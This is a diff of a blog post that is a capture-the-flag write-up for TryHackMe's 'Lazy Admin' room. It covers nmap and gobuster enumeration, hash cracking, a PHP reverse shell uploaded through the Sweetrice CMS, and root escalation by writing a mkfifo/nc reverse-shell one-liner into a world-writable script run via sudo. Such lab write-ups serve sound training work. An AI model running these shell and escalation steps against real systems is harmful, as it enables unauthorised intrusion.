@@ -4,16 +4,18 @@ author : Seif-Allah
 description : Beginner level writeUp for the "Lazy Admin" room.
 layout : post
 category : CTF-WriteUp
+image : /assets/images/writeups/thm/lazy_admin/lazy.png
+toc : true
 ---
 Room Link : [Lazy Admin](https://tryhackme.com/room/lazyadmin)
-### <mark style='background-color: white'>Introduction</mark>
+### Introduction
 'Lazy Admin' is an easy room made by [MrSeth6797](https://tryhackme.com/p/MrSeth6797), great for practice challenges. 
 Let's get started! 
 
-### <mark style='background-color: white'>Enumeration</mark>
+### Enumeration
 Starting Nmap with the -A flag, here's the output : 
 - - -
-<pre>
+```bash
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -28,7 +30,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_  Supported Methods: HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
-</pre>
+```
 - - - 
 Examining the source code of the running web service looking for some creds, found nothing. So I fire up gobuster using the *directory-list-2.3-medium.txt* wordlist and found a subdirectory called */content* : 
 ![/content](/assets/images/writeups/thm/lazy_admin/user_flag.png)
@@ -41,10 +43,10 @@ I examine the other subdirectories and there's a specific file that got my atten
 Examining it carefully, I found a username and a password hash (*line 79*).
 The password hash type is MD5, I used hydra to crack it using the *rockyou.txt* wordlist and then logged in the *Sweetrice* CMS, easy hein ? 
 
-### <mark style='background-color: white'>USER.txt - Easy Peasy</mark>
+### User Flag
 To get the reverse shell, I simply started my listener (*nc -nlvp 1234*) and then copied the */usr/share/webshells/php/php-reverse-shell.php* file inside the ads section, save it and run it as mentionad in the script above. and boom! got the reverse shell ! 
 - - - 
-<pre>
+```bash
 listening on [any] 1234 ...
 connect to [10.2.36.150] from (UNKNOWN) [10.10.217.36] 56240
 Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
@@ -55,27 +57,27 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami
 www-data
 $ 
-</pre>
+```
 - - -
 This time, I was lucky by opening the *user.txt* file without any privelage escalation, and yeah it works ! 
 - - - 
-<pre>
+```bash
 $ cd /home
 $ ls
 itguy
 $ cd itguy
 $ cat user.txt
 THM{#####################}
-</pre>
+```
 - - -
 
 
-### <mark style='background-color:white'>ROOT.txt</mark>
+### Root Flag
 Now we need to find a way to get the root flag !
 First of all, I ran *sudo -l* command : 
 - - -
 
-<pre>
+```bash
 $ sudo -l 
 Matching Defaults entries for www-data on THM-Chal:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -83,39 +85,39 @@ Matching Defaults entries for www-data on THM-Chal:
 User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 $ 
-</pre>
+```
 
 - - -
 Well, the user www-data can run the following command ? let's open the backup.pl file ! 
 - - -
-<pre>
+```bash
 $ cat /home/itguy/backup.pl
 #!/usr/bin/perl
 
 system("sh", "/etc/copy.sh");
-</pre>
+```
 - - -
 hum ! can we edit the copy.sh file so it gets executed as root ? 
 - - -
-<pre>
+```bash
 $ ls -al /etc/copy.sh
 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
-</pre>
+```
 - - -
 and yeah we can edit it, SUPER ! So the first idea tha came in my mind is to get an another reverse shell using this command : 
 - - - 
-<pre> 
+```bash
 $ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \<local-ip\> 5554 \>/tmp/f' \>/etc/copy.sh
-</pre>
+```
 - - - 
 After setting up the listener and ran the command, I got the root shell ! now it's time the get root flag !! :) finally ! 
 - - - 
-<pre>
+```bash
 root@kali:~# nc -nlvp 5554
 listening on [any] 5554 ...
 connect to [10.2.36.150] from (UNKNOWN) [10.10.217.36] 51512
 /bin/sh: 0: can't access tty; job control turned off
 # cat /root/root.txt
-</pre>
+```
 - - - 
 Congrats, now you pissed off the lazy admin ! 
